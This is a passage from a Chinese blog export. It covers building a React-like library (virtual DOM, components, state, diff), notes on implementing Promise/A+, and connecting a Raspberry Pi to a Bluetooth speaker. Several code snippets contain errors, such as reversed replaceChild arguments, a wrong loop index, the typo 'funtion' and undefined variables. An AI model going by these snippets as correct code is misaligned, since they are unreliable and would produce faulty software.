(oldDom.textContent !== newVdom) &#123; // 这里一个细节：textContent/innerHTML/innerText 的区别 oldDom.textContent = newVdom &#125; &#125; else &#123; // 如果旧 dom 元素不为文本节点 dom = document.createTextNode(newVdom) if (oldDom &amp;&amp; oldDom.parentNode) &#123; oldDom.parentNode.replaceChild(dom, oldDom) &#125; &#125; return dom&#125; 对比非文本节点对比非文本节点，其思路为将同层级的旧节点替换为新节点，代码如下： 12345678// 对比非文本节点function diffNotTextDom(oldDom, newVdom) &#123; const newDom = document.createElement(newVdom.nodeName); [...oldDom.childNodes].map(newDom.appendChild) // 将旧节点下的元素添加到新节点下 if (oldDom &amp;&amp; oldDom.parentNode) &#123; oldDom.parentNode.replaceChild(oldDom, newDom) &#125;&#125; 对比自定义组件对比自定义组件的思路为：如果新老组件不同，则直接将新组件替换老组件；如果新老组件相同，则将新组件的 props 赋到老组件上，然后再对获得新 props 前后的老组件做 diff 比较。代码如下： 1234567891011// 对比自定义组件function diffComponent(oldDom, newVdom) &#123; if (oldDom._component &amp;&amp; (oldDom._component.constructor !== newVdom.nodeName)) &#123; // 如果新老组件不同，则直接将新组件替换老组件 const newDom = vdomToDom(newVdom) oldDom._component.parentNode.insertBefore(newDom, oldDom._component) oldDom._component.parentNode.removeChild(oldDom._component) &#125; else &#123; setProps(oldDom._component, newVdom.attributes) // 如果新老组件相同，则将新组件的 props 赋到老组件上 renderComponent(oldDom._component) // 对获得新 props 前后的老组件做 diff 比较（renderComponent 中调用了 diff） &#125;&#125; 遍历对比子节点遍历对比子节点的策略有两个：一是只比较同层级的节点，二是给节点加上 key 属性。它们的目的都是降低空间复杂度。代码如下： 12345678910111213141516171819202122232425262728293031// 对比子节点function diffChild(oldDom, newVdom) &#123; const keyed = &#123;&#125; const children = [] const oldChildNodes = oldDom.childNodes for (let i = 0; i &lt; oldChildNodes.length; i++) &#123; if (oldChildNodes[i].key) &#123; // 将含有 key 的节点存进对象 keyed keyed[oldChildNodes[i].key] = oldChildNodes[i] &#125; else &#123; // 将不含有 key 的节点存进数组 children children.push(oldChildNodes[i]) &#125; &#125; const newChildNodes = newVdom.children let child for (let i = 0; i &lt; newChildNodes.length; i++) &#123; if (keyed[newChildNodes[i].key]) &#123; // 对应上面存在 key 的情形 child = keyed[newChildNodes[i].key] keyed[newChildNodes[i].key] = undefined &#125; else &#123; // 对应上面不存在 key 的情形 for (let j = 0; j &lt; children.length; j++) &#123; if (isSameNodeType(children[i], newChildNodes[i])) &#123; // 如果不存在 key，则优先找到节点类型相同的元素 child = children[i] children[i] = undefined break &#125; &#125; &#125; diff(child, newChildNodes[i]) // 递归比较 &#125;&#125; 测试在生命周期的小节中，componentWillReceiveProps 方法还未跑通，稍加修改 setProps 函数即可： 1234567891011121314/** * 更改属性，componentWillMount 和 componentWillReceiveProps 方法 */function setProps(component, attributes) &#123; if (attributes) &#123; component.props = attributes // 这段逻辑对应上文自定义组件比较中新老组件相同时 setProps 的逻辑 &#125; if (component &amp;&amp; component.base &amp;&amp; component.componentWillReceiveProps) &#123; component.componentWillReceiveProps(component.props) &#125; else if (component &amp;&amp; component.componentWillMount) &#123; component.componentWillMount() &#125;&#125; 来测试下生命周期小节中最后的测试用例： 生命周期测试 diff 测试 鸣谢Especially thank simple-react for the guidance function of this library. At the meantime，respect for preact and react]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从 0 到 1 实现 React 系列 —— 2.组件和 state|props]]></title>
    <url>%2Fblog%2F2018%2F07%2F12%2F%E4%BB%8E-0-%E5%88%B0-1-%E5%AE%9E%E7%8E%B0-React-%E7%B3%BB%E5%88%97-%E2%80%94%E2%80%94-2.%E7%BB%84%E4%BB%B6%E5%92%8C-state-props%2F</url>
    <content type="text"><![CDATA[本系列文章在实现一个 cpreact 的同时帮助大家理顺 React 框架的核心内容(JSX/虚拟DOM/组件/生命周期/diff算法/setState/PureComponent/HOC/…) 项目地址 从 0 到 1 实现 React 系列 —— JSX 和 Virtual DOM 从 0 到 1 实现 React 系列 —— 组件和 state|props 从 0 到 1 实现 React 系列 —— 生命周期和 diff 算法 从 0 到 1 实现 React 系列 —— 优化 setState 和 ref 的实现 从 0 到 1 实现 React 系列 —— PureComponent 实现 &amp;&amp; HOC 探幽 组件即函数在上一篇 JSX 和 Virtual DOM 中，解释了 JSX 渲染到界面的过程并实现了相应代码，代码调用如下所示： 12345678910111213import React from 'react'import ReactDOM from 'react-dom'const element = ( &lt;div className="title"&gt; hello&lt;span className="content"&gt;world!&lt;/span&gt; &lt;/div&gt;)ReactDOM.render( element, document.getElementById('root')) 本小节，我们接着探究组件渲染到界面的过程。在此我们引入组件的概念，组件本质上就是一个函数，如下就是一段标准组件代码： 12345678910111213import React from 'react'// 写法 1：class A &#123; render() &#123; return &lt;div&gt;I'm componentA&lt;/div&gt; &#125;&#125;// 写法 2：无状态组件const A = () =&gt; &lt;div&gt;I'm componentA&lt;/div&gt;ReactDOM.render(&lt;A /&gt;, document.body) &lt;A name=&quot;componentA&quot; /&gt; 是 JSX 的写法，和上一篇同理，babel 将其转化为 React.createElement() 的形式，转化结果如下所示： 1React.createElement(A, null) 可以看到当 JSX 中是自定义组件的时候，createElement 后接的第一个参数变为了函数，在 repl 打印 &lt;A name=&quot;componentA&quot; /&gt;，结果如下： 123456&#123; attributes: undefined, children: [], key: undefined, nodeName: ƒ A()&#125; 注意这时返回的 Virtual DOM 中的 nodeName 也变为了函数。根据这些线索，我们对之前的 render 函数进行改造。 12345678910111213function render(vdom, container) &#123; if (_.isFunction(vdom.nodeName)) &#123; // 如果 JSX 中是自定义组件 let component, returnVdom if (vdom.nodeName.prototype.render) &#123; component = new vdom.nodeName() returnVdom = component.render() &#125; else &#123; returnVdom = vdom.nodeName() // 针对无状态组件：const A = () =&gt; &lt;div&gt;I'm componentsA&lt;/div&gt; &#125; render(returnVdom, container) return &#125;&#125; 至此，我们完成了对组件的处理逻辑。 props 和 state 的实现在上个小节组件 A 中，是没有引入任何属性和状态的，我们希望组件间能进行属性的传递(props)以及组件内能进行状态的记录(state)。 123456789import React, &#123; Component &#125; from 'react'class A extends Component &#123; render() &#123; return &lt;div&gt;I'm &#123;this.props.name&#125;&lt;/div&gt; &#125;&#125;ReactDOM.render(&lt;A name="componentA" /&gt;, document.body) 在上面这段代码中，看到 A 函数继承自 Component。我们来构造这个父类 Component，并在其添加 state、props、setState 等属性方法，从而让子类继承到它们。 1234function Component(props) &#123; this.props = props this.state = this.state || &#123;&#125;&#125; 首先，我们将组件外的 props 传进组件内，修改 render 函数中以下代码： 12345678910111213function render(vdom, container) &#123; if (_.isFunction(vdom.nodeName)) &#123; let component, returnVdom if (vdom.nodeName.prototype.render) &#123; component = new vdom.nodeName(vdom.attributes) // 将组件外的 props 传进组件内 returnVdom = component.render() &#125; else &#123; returnVdom = vdom.nodeName(vdom.attributes) // 处理无状态组件：const A = (props) =&gt; &lt;div&gt;I'm &#123;props.name&#125;&lt;/div&gt; &#125; ... &#125; ...&#125; 实现完组件间 props 的传递后，再来聊聊 state，在 react 中是通过 setState 来完成组件状态的改变的，后续章节会对这个 api（异步）深入探究，这里简单实现如下： 1234567891011function Component(props) &#123; this.props = props this.state = this.state || &#123;&#125;&#125;Component.prototype.setState = function() &#123; this.state = Object.assign(&#123;&#125;, this.state, updateObj) // 这里简单实现，后续篇章会深入探究 const returnVdom = this.render() // 重新渲染 document.getElementById('root').innerHTML = null render(returnVdom, document.getElementById('root'))&#125; 此时虽然已经实现了 setState 的功能，但是 document.getElementById(&#39;root&#39;) 节点写死在 setState 中显然不是我们希望的，我们将 dom 节点相关转移到 _render 函数中： 1234Component.prototype.setState = function(updateObj) &#123; this.state = Object.assign(&#123;&#125;, this.state, updateObj) _render(this) // 重新渲染&#125; 自然地，重构与之相关的 render 函数： 1234567891011function render(vdom, container) &#123; let component if (_.isFunction(vdom.nodeName)) &#123; if (vdom.nodeName.prototype.render) &#123; component = new vdom.nodeName(vdom.attributes) &#125; else &#123; component = vdom.nodeName(vdom.attributes) // 处理无状态组件：const A = (props) =&gt; &lt;div&gt;I'm &#123;props.name&#125;&lt;/div&gt; &#125; &#125; component ? _render(component, container) : _render(vdom, container)&#125; 在 render 函数中分离出 _render 函数的目的是为了让 setState 函数中也能调用 _render 逻辑。完整 _render 函数如下： 12345678910111213141516171819function _render(component, container) &#123; const vdom = component.render ? component.render() : component if (_.isString(vdom) || _.isNumber(vdom)) &#123; container.innerText = container.innerText + vdom return &#125; const dom = document.createElement(vdom.nodeName) for (let attr in vdom.attributes) &#123; setAttribute(dom, attr, vdom.attributes[attr]) &#125; vdom.children.forEach(vdomChild =&gt; render(vdomChild, dom)) if (component.container) &#123; // 注意：调用 setState 方法时是进入这段逻辑，从而实现我们将 dom 的逻辑与 setState 函数分离的目标；知识点: new 出来的同一个实例 component.container.innerHTML = null component.container.appendChild(dom) return &#125; component.container = container container.appendChild(dom)&#125; 让我们用下面这个用例跑下写好的 react 吧！ 12345678910111213141516171819202122232425262728class A extends Component &#123; constructor(props) &#123; super(props) this.state = &#123; count: 1 &#125; &#125; click() &#123; this.setState(&#123; count: ++this.state.count &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;button onClick=&#123;this.click.bind(this)&#125;&gt;Click Me!&lt;/button&gt; &lt;div&gt;&#123;this.props.name&#125;:&#123;this.state.count&#125;&lt;/div&gt; &lt;/div&gt; ) &#125;&#125;ReactDOM.render( &lt;A name="count" /&gt;, document.getElementById('root')) 效果图如下： 至此，我们实现了 props 和 state 部分的逻辑。 forceUpdate 的实现 声明：这部分为补充章节，可以选择性阅读。涉及到后文生命周期、setState 章节的知识点。 当没有使用 setState 更新 state 状态时，通常要结合 forceUpdate 一起使用，例子如下： 12345678910111213141516171819202122232425262728class B extends Component &#123; constructor(props) &#123; super(props) this.state = &#123; count: &#123; value: 1 &#125; &#125; &#125; shouldComponentUpdate() &#123; // 当使用 forceUpdate() 时，shouldComponentUpdate() 会失效 return false &#125; click() &#123; this.state.count.value = ++this.state.count.value // 没有使用 setState 更新 state 状态时，通常要结合 forceUpdate 一起使用 this.forceUpdate() &#125; render() &#123; return ( &lt;div&gt; &lt;button onClick=&#123;this.click.bind(this)&#125;&gt;Click Me!&lt;/button&gt; &lt;div&gt;&#123;this.state.count.value&#125;&lt;/div&gt; &lt;/div&gt; ) &#125;&#125; 这里要注意一个点当使用 forceUpdate() 时，shouldComponentUpdate() 会失效，下面我们来补充 forceUpdate() 的代码逻辑： 12345// force to updateComponent.prototype.forceUpdate = function(cb) &#123; this.allowShouldComponentUpdate = false // 不允许 allowShouldComponentUpdate 执行 asyncRender(&#123;&#125;, this, cb)&#125; 相应的在 render.js 中加上 allowShouldComponentUpdate 的判断条件： 123456789function renderComponent(component) &#123; if (component.base &amp;&amp; component.shouldComponentUpdate &amp;&amp; component.allowShouldComponentUpdate !== false) &#123; // 加上 allowShouldComponentUpdate 的判断条件 const bool = component.shouldComponentUpdate(component.props, component.state) if (!bool &amp;&amp; bool !== undefined) &#123; return false // shouldComponentUpdate() 返回 false，则生命周期终止 &#125; &#125; ...&#125; 小结组件即函数；当 JSX 中是自定义组件时，经过 babel 转化后的 React.createElement(fn, ..) 后中的第一个参数变为了函数，除此之外其它逻辑与 JSX 中为 html 元素的时候相同； 此外我们将 state/props/setState 等 api 封装进了父类 React.Component 中，从而在子类中能调用这些属性和方法。 在下篇，我们会继续实现生命周期机制，如有疏漏，欢迎斧正。 鸣谢Especially thank simple-react for the guidance function of this library. At the meantime，respect for preact and react]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从 0 到 1 实现 React 系列 —— 1.JSX 和 Virtual DOM]]></title>
    <url>%2Fblog%2F2018%2F07%2F06%2F%E4%BB%8E-0-%E5%88%B0-1-%E5%AE%9E%E7%8E%B0-React-%E7%B3%BB%E5%88%97-%E2%80%94%E2%80%94-1.JSX-%E5%92%8C-Virtual-DOM%2F</url>
    <content type="text"><![CDATA[本系列文章在实现一个 cpreact 的同时帮助大家理顺 React 框架的核心内容(JSX/虚拟DOM/组件/生命周期/diff算法/setState/PureComponent/HOC/…) 项目地址 从 0 到 1 实现 React 系列 —— JSX 和 Virtual DOM 从 0 到 1 实现 React 系列 —— 组件和 state|props 从 0 到 1 实现 React 系列 —— 生命周期和 diff 算法 从 0 到 1 实现 React 系列 —— 优化 setState 和 ref 的实现 从 0 到 1 实现 React 系列 —— PureComponent 实现 &amp;&amp; HOC 探幽 环境准备项目打包工具选择了 parcel，使用其可以快速地进入项目开发的状态。快速开始 此外需要安装以下 babel 插件： 1234"@babel/core": "^7.0.0","@babel/preset-env": "^7.0.0","@babel/preset-react": "^7.0.0","babel-loader": "v8.0.0-beta.0", 同时 .babelrc 配置如下： 12345678910111213141516&#123; "presets": [ [ "@babel/preset-env", &#123; "targets": "&gt; 0.25%, not dead", "useBuiltIns": "entry" &#125; ], [ "@babel/preset-react", &#123; "pragma": "cpreact.createElement" // 该参数传向 transform-react-jsx 插件，是前置的一个核心，后文有解释为什么使用 cpreact.createElement &#125; ] ]&#125; 配置好 babel 后，接着提供两套打包工具的配置方案，读者可以自行选择。 方案 1：使用 webpackwebpack 拥有一个活跃的社区，提供了更为丰富的打包能力。 首先安装以下模块： 123&quot;webpack&quot;: &quot;^4.17.2&quot;,&quot;webpack-cli&quot;: &quot;^3.1.0&quot;,&quot;webpack-dev-server&quot;: &quot;^3.1.8&quot; 在根目录的 webpack.config.js 配置如下： 1234567891011121314151617181920212223const webpack = require('webpack')const path = require('path')const rootPath = path.resolve(__dirname)module.exports = &#123; entry: path.resolve(rootPath, 'test', 'index.js'), mode: 'development', devtool: 'inline-source-map', devServer: &#123; contentBase: './dist' &#125;, output: &#123; filename: 'cpreact.js', path: path.resolve(rootPath, 'dist'), libraryTarget: 'umd' &#125;, module: &#123; rules: [&#123; test: /\.js$/, loader: "babel-loader", &#125;] &#125;,&#125; 然后在 package.json 里加上如下配置： 123&quot;scripts&quot;: &#123; &quot;start&quot;: &quot;webpack-dev-server --open&quot;,&#125;, 具体可以参照 0.4.3 版本 方案 2：使用 parcelparcel 是一款上手极快的打包工具，使用其可以快速地进入项目开发的状态。在 package.json 加上如下配置，具体可以参照 0.1 版本 123&quot;scripts&quot;: &#123; &quot;start&quot;: &quot;parcel ./index.html --open -p 8080 --no-cache&quot;&#125;, JSX 和 虚拟 DOM12345const element = ( &lt;div className="title"&gt; hello&lt;span className="content"&gt;world!&lt;/span&gt; &lt;/div&gt;) JSX 是一种语法糖，经过 babel 转换结果如下，可以发现实际上转化成 React.createElement() 的形式： 12345678910var element = React.createElement( "div", &#123; className: "title" &#125;, "hello", React.createElement( "span", &#123; className: "content" &#125;, "world!" )); 打印 element, 结果如下： 123456&#123; attributes: &#123;className: "title"&#125; children: ["hello", t] // t 和外层对象相同 key: undefined nodeName: "div"&#125; 因此，我们得出结论：JSX 语法糖经过 Babel 编译后转换成一种对象，该对象即所谓的虚拟 DOM，使用虚拟 DOM 能让页面进行更为高效的渲染。 我们按照这种思路进行函数的构造： 123456789101112131415161718192021222324252627const React = &#123; createElement&#125;function createElement(tag, attr, ...child) &#123; return &#123; attributes: attr, children: child, key: undefined, nodeName: tag, &#125;&#125;// 测试const element = ( &lt;div className="title"&gt; hello&lt;span className="content"&gt;world!&lt;/span&gt; &lt;/div&gt;)console.log(element) // 打印结果符合预期// &#123;// attributes: &#123;className: "title"&#125;// children: ["hello", t] // t 和外层对象相同// key: undefined// nodeName: "div"// &#125; 虚拟 DOM 转化为真实 DOM上个小节介绍了 JSX 转化为虚拟 DOM 的过程，这个小节接着来实现将虚拟 DOM 转化为真实 DOM (页面上渲染的是真实 DOM)。 我们知道在 React 中，将虚拟 DOM 转化为真实 DOM 是使用 ReactDOM.render 实现的，使用如下： 123456import ReactDOM from 'react-dom'ReactDOM.render( element, // 上文的 element，即虚拟 dom document.getElementById('root')) 接着来实现 ReactDOM.render 的逻辑: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748const ReactDOM = &#123; render&#125;/** * 将虚拟 DOM 转化为真实 DOM * @param &#123;*&#125; vdom 虚拟 DOM * @param &#123;*&#125; container 需要插入的位置 */function render(vdom, container) &#123; if (_.isString(vdom) || _.isNumber(vdom)) &#123; container.innerText = container.innerText + vdom // fix &lt;div&gt;I'm &#123;this.props.name&#125;&lt;/div&gt; return &#125; const dom = document.createElement(vdom.nodeName) for (let attr in vdom.attributes) &#123; setAttribute(dom, attr, vdom.attributes[attr]) &#125; vdom.children.forEach(vdomChild =&gt; render(vdomChild, dom)) container.appendChild(dom)&#125;/** * 给节点设置属性 * @param &#123;*&#125; dom 操作元素 * @param &#123;*&#125; attr 操作元素属性 * @param &#123;*&#125; value 操作元素值 */function setAttribute(dom, attr, value) &#123; if (attr === 'className') &#123; attr = 'class' &#125; if (attr.match('/on\w+/')) &#123; // 处理事件的属性: const eventName = attr.toLowerCase().substr(2) dom.addEventListener(eventName, value) &#125; else if (attr === 'style') &#123; // 处理样式的属性: let styleStr = '' let standardCss for (let klass in value) &#123; standardCss = humpToStandard(klass) // 处理驼峰样式为标准样式 value[klass] = _.isNumber(+value[klass]) ? value[klass] + 'px' : value[klass] // style=&#123;&#123; className: '20' || '20px' &#125;&#125;&gt; styleStr += `$&#123;standardCss&#125;: $&#123;value[klass]&#125;;` &#125; dom.setAttribute(attr, styleStr) &#125; else &#123; // 其它属性 dom.setAttribute(attr, value) &#125;&#125; 至此，我们成功将虚拟 DOM 复原为真实 DOM，展示如下： 另外配合热更新，在热更新的时候清空之前的 dom 元素，改动如下： 123456const ReactDOM = &#123; render(vdom, container) &#123; container.innerHTML = null render(vdom, container) &#125;&#125; 小结JSX 经过 babel 编译为 React.createElement() 的形式，其返回结果就是 Virtual DOM，最后通过 ReactDOM.render() 将 Virtual DOM 转化为真实的 DOM 展现在界面上。流程图如下： 思考题如下是一个 react/preact 的常用组件的写法，那么为什么要 import 一个 React 或者 h 呢？ 12345678910import React, &#123; Component &#125; from 'react' // react// import &#123; h, Component &#125; from 'preact' // preactclass A extends Component &#123; render() &#123; return &lt;div&gt;I'm componentA&lt;/div&gt; &#125;&#125;render(&lt;A /&gt;, document.body) // 组件的挂载 项目说明该系列文章会尽可能的分析项目细节，具体的还是以项目实际代码为准。 鸣谢Especially thank simple-react for the guidance function of this library. At the meantime，respect for preact and react]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS 异步系列 —— Promise 札记]]></title>
    <url>%2Fblog%2F2018%2F07%2F02%2FPromise-%E6%9C%AD%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[实践了一个符合 Promise/A+ 规范的 repromise Promise 札记研究 Promise 的动机大体有以下几点： 对其 api 的不熟悉以及对实现机制的好奇; 很多库(比如 fetch)是基于 Promise 封装的，那么要了解这些库的前置条件得先熟悉 Promise; 要了解其它更为高级的异步操作得先熟悉 Promise; 基于这些目的，实践了一个符合 Promise/A+ 规范的 repromise 本札记系列总共三篇文章，作为之前的文章 Node.js 异步异闻录 的拆分和矫正。 Promise札记 Generator札记 Async札记 Promise/A+ 核心 在实现一个符合 Promise/A+ 规范的 promise 之前，先了解下 Promise/A+ 核心，想更全面地了解可以阅读 Promise/A+规范 Promise 操作只会处在 3 种状态的一种：未完成态(pending)、完成态(resolved) 和失败态(rejected); Promise 的状态只会出现从未完成态向完成态或失败态转化; Promise 的状态一旦转化，将不能被更改; repromise api 食用手册Promise.resolve()Promise.resolve() 括号内有 4 种情况 123456789101112131415161718192021/* 跟 Promise 对象 */Promise.resolve(Promise.resolve(1))// Promise &#123;state: "resolved", data: 1, callbackQueue: Array(0)&#125;/* 跟 thenable 对象 */var thenable = &#123; then: function(resolve, reject) &#123; resolve(1) &#125;&#125;Promise.resolve(thenable)// Promise &#123;state: "resolved", data: 1, callbackQueue: Array(0)&#125;/* 普通参数 */Promise.resolve(1)// Promise &#123;state: "resolved", data: 1, callbackQueue: Array(0)&#125;/* 不跟参数 */Promise.resolve()// Promise &#123;state: "resolved", data: undefined, callbackQueue: Array(0)&#125; Promise.reject()相较于 Promise.resolve()，Promise.reject() 原封不动地返回参数值 Promise.all(arr)对于 Promise.all(arr) 来说，在参数数组中所有元素都变为决定态后，然后才返回新的 promise。 1234567891011// 以下 demo，请求两个 url，当两个异步请求返还结果后，再请求第三个 urlconst p1 = request(`http://some.url.1`)const p2 = request(`http://some.url.2`)Promise.all([p1, p2]) .then((datas) =&gt; &#123; // 此处 datas 为调用 p1, p2 后的结果的数组 return request(`http://some.url.3?a=$&#123;datas[0]&#125;&amp;b=$&#123;datas[1]&#125;`) &#125;) .then((data) =&gt; &#123; console.log(msg) &#125;) Promise.race(arr)对于 Promise.race(arr) 来说，只要参数数组有一个元素变为决定态，便返回新的 promise。 1234567891011// race 译为竞争，同样是请求两个 url，当且仅当一个请求返还结果后，就请求第三个 urlconst p1 = request(`http://some.url.1`)const p2 = request(`http://some.url.2`)Promise.race([p1, p2]) .then((data) =&gt; &#123; // 此处 data 取调用 p1, p2 后优先返回的结果 return request(`http://some.url.3?value=$&#123;data&#125;`) &#125;) .then((data) =&gt; &#123; console.log(data) &#125;) Promise.wrap(fn) —— 回调函数转 Promise通过下面这个案例，提供回调函数 Promise 化的思路。 1234567891011121314function foo(a, b, cb) &#123; ajax( `http://some.url?a=$&#123;a&#125;&amp;b=$&#123;b&#125;`, cb )&#125;foo(1, 2, function(err, data) &#123; if (err) &#123; console.log(err) &#125; else &#123; console.log(data) &#125;&#125;) 如上是一个传统回调函数使用案例，只要使用 Promise.wrap() 包裹 foo 函数就对其完成了 promise 化，使用如下： 123456789const promiseFoo = Promise.wrap(foo)promiseFoo(1, 2) .then((data) =&gt; &#123; console.log(data) &#125;) .catch((err) =&gt; &#123; console.log(err) &#125;) Promise.wrap 的实现逻辑也顺带列出来了： 1234567891011121314Promise.wrap = function(fn) &#123; return funtion() &#123; const args = [].slice.call(arguments) return new Promise((resolve, reject) =&gt; &#123; fn.apply(null, args.concat((err, data) =&gt; &#123; if (err) &#123; reject(err) &#125; else &#123; resolve(data) &#125; &#125;)) &#125;) &#125;&#125; then/catch/done这几个 api 比较简单，合起来一起带过 1234Promise.resolve(1) .then((data) =&gt; &#123;console.log(data)&#125;, (err) =&gt; &#123;console.log(err)&#125;) // 链式调用，可以传一个参数(推荐)，也可以传两个参数 .catch((err) =&gt; &#123;console.log(err)&#125;) // 捕获链式调用中抛出的错误 || 捕获变为失败态的值 .done() // 能捕获前面链式调用的错误(包括 catch 中)，可以传两个参数也可不传 实践过程总结坑点 1：事件循环 事件循环：同步队列执行完后，在指定时间后再执行异步队列的内容。 之所以要单列事件循环，因为代码的执行顺序与其息息相关，此处用 setTimeout 来模拟事件循环； 下面代码片段中，① 处执行完并不会马上执行 setTimeout() 中的代码(③)，而是此时有多少次 then 的调用，就会重新进入 ② 处多少次后，再进入 ③ 123456789101112131415161718excuteAsyncCallback(callback, value) &#123; const that = this setTimeout(function() &#123; const res = callback(value) // ③ that.excuteCallback('fulfilled', res) &#125;, 4)&#125;then(onResolved, onRejected) &#123; const promise = new this.constructor() if (this.state !== 'PENDING') &#123; const callback = this.state === 'fulfilled' ? onResolved : onRejected this.excuteAsyncCallback.call(promise, callback, this.data) // ① &#125; else &#123; this.callbackArr.push(new CallbackItem(promise, onResolved, onRejected)) // ② &#125; return promise&#125; 坑点 2：this 的指向问题this.callbackArr.push() 中的 this 指向的是 ‘上一个’ promise，所以类 CallbackItem 中，this.promise 存储的是’下一个’ promise(then 对象)。 1234567891011121314151617181920212223class Promise &#123; ... then(onResolved, onRejected) &#123; const promise = new this.constructor() if (this.state !== 'PENDING') &#123; // 第一次进入 then，状态是 RESOLVED 或者是 REJECTED const callback = this.state === 'fulfilled' ? onResolved : onRejected this.excuteAsyncCallback.call(promise, callback, this.data) // 绑定 this 到 promise &#125; else &#123; // 从第二次开始以后，进入 then，状态是 PENDING this.callbackArr.push(new CallbackItem(promise, onResolved, onRejected)) // 这里的 this 也是指向‘上一个’ promise &#125; return promise &#125; ...&#125;class CallbackItem &#123; constructor(promise, onResolve, onReject) &#123; this.promise = promise // 相应地，这里存储的 promise 是来自下一个 then 的 this.onResolve = typeof(onResolve) === 'function' ? onResolve : (resolve) =&gt; &#123;&#125; this.onReject = typeof(onRejected) === 'function' ? onRejected : (rejected) =&gt; &#123;&#125; &#125; ...&#125; more实践的更多过程可以参考测试用例。有好的意见欢迎交流。]]></content>
      <categories>
        <category>Promise</category>
      </categories>
      <tags>
        <tag>Promise</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[系列 - 树莓派外接蓝牙音箱（四）]]></title>
    <url>%2Fblog%2F2018%2F06%2F18%2F2018-06-18-rasyberry-pi-playback%2F</url>
    <content type="text"><![CDATA[为啥第四篇写的是外接蓝牙音箱？那是因为我在阅读文章的时候，不小心看到了通过命令行进行蓝牙操作： 1234567sudo bluetoothctl;power onscan onagent onpair MACtrust MACconnect MAC 尝试了一次，这些命令瞬间便记住了，但记住了还不够呀，需要找个场景试验下——外接一个蓝牙音箱，让树莓派的音频流在音箱中播放。感觉这个操作会有点意思，为了增加点难度，再设计一个按钮开关，通过按压操作来连接或断开蓝牙音箱。 可视化操作树莓派并不是一个无界面的纯终端，首先，我们来看看如何通过 VNC 进行可视化操作： 1234# 给板子装客户端sudo apt-get install tightvncserver# 开启一个 VNC 流，代号为 1tightvncserver :1 然后在 Mac 上安装 VNC Viewer 客户端，然后连接 IP:1，IP 为树莓派的地址： 在这个系列中，我会尽可能少地进行可视化操作，毕竟这种操作的意义不大，板子的性能本身就不高，额外开一个可视化的操作界面，会比较卡。 蓝牙连接（界面操作）如果你钟爱界面化操作，可以安装一个蓝牙管理软件： 1sudo apt-get install pi-bluetooth blueman 安装好了以后，可以在 Preferences -&gt; Bluetooth Manager，找到蓝牙列表： 打开浏览器，在线播放一首音乐，你会发现，咦，为啥没有声音？原因在这里： 在音量控制处右键，会看到一个列表： Anlog，是通过耳机线出声，耳机插上板子就有声音了，音质比较差 HDMI，需要通过 USB 接口连接播放器 下面几个是连接的蓝牙设备，必须勾上才会出声 事实上，我勾上了蓝牙设备，依然没有声音，没具体折腾为啥，但在音量控制面板中的第一个 Tab 勾选下对应设备就好了： 在调试引脚时，发现再一次没声音了，摸索了好几次，发现这么处理可以解决问题，屡试不爽： 12345678# 先把 GPIO 引脚上的线给拔了，不拔可能会影响蓝牙驱动的加载？不知道，先拔了# 如果之前插着线，重启，重新加载驱动sudo reboot# 再看看是否有报错，比如 Sap driver initialization failed.service bluetooth status# 如果有错误，重新启动下，可以选择 rootservice bluetooth restart# 然后重新连接蓝牙，一般声音就来了 不知道是否是驱动在 Linux 内核加载的时候存在问题还是有其他问题，没有深究，先这么凑合着处理吧。 蓝牙连接（硬件控制）下面我们增加一个外部控制开关来实现，通过外部开关控制外投音频的音量（静音和打开）。 当开关 S1 拨下时，LED1 会亮起，此时 S 端（PIN12/GPIO18）为低电位。我们只需要读取 P12 的信号就可以知道开关是否被按下了，程序如下： 12345678910111213141516171819202122const execSync = require('child_process').execSync;const Gpio = require('rpio2').Gpio;// 初始化 PIN12const button = new Gpio(12);button.open(Gpio.INPUT);button.on('rising', () =&gt; &#123; execSync('pactl set-sink-volume 1 100%'); console.log('open sound');&#125;);button.on('falling', () =&gt; &#123; execSync('pactl set-sink-volume 1 0%'); console.log('mute');&#125;);process.on("SIGINT", () =&gt; &#123; button.close(); console.log('shutdown!'); process.exit(0);&#125;); 程序并不优雅，但是要实现的功能大致就是这个意思。这段程序看似没有问题，不知道是系统问题还是 rpio2 这个库的问题，在接收上升沿和下降沿信号时经常让板子宕机，这个问题还需要好好研究下。 花了好几个小时来回折腾，完成了这个实验性的小玩具，生活中我肯定不会用它，因为它过于简陋。这里我还给自己加了一道拓展题，如何识别多次按钮点击，然后根据点击的次数执行不同任务，结果写出来的程序，当按钮按下时，系统总是奔溃，就没有继续了，感兴趣的读者可以尝试下~]]></content>
      <categories>
        <category>硬件开发</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[系列 - 认识树莓派 GPIO（三）]]></title>
    <url>%2Fblog%2F2018%2F06%2F16%2F2018-06-16-rasyberry-pi-gpio%2F</url>
